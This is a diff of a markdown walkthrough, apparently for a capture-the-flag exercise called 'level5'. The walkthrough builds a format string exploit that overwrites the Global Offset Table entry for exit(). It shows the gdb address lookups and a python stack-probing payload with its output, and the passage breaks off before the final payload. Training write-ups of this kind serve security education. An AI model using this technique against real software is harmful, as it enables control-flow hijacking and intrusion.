@@ -19,21 +19,25 @@ We have to attack the Global Offset Table, which is a table that store pointer t
 ### Building the payload
 
 We want to build this payload :
+
 **exit ADRESS (GOT) + o ADRESS + PLACE OF OUR INPUT IN STACK + %n**
 
 ``gdb level5``
 
 **Getting the o function adress :**
+
 ``(gdb) info functions``
 >[...]
 0x080484a4  o
 
 **Getting GOT adress range :**
+
 ``(gdb) info files``
 >[...]
 0x08049818 - 0x08049840 is .got.plt
 
 **Let's find the function we want to overwrite, exit() :**
+
 ``(gdb) x/16wx 0x08049818``
 >0x8049818 <_GLOBAL_OFFSET_TABLE_>:	0x0804974c	0x00000000	0x00000000	0x08048386
 [...]
@@ -41,7 +45,9 @@ We want to build this payload :
 [...]
 
 **As usual we make a payload to see where we can put our adress.**
+
 ``python -c "print 'AAAA' + ' %x '*4" | ./level5``
+
 >AAAA 200  b7fd1ac0  b7ff37d0  41414141
 
 So, our final payload is :
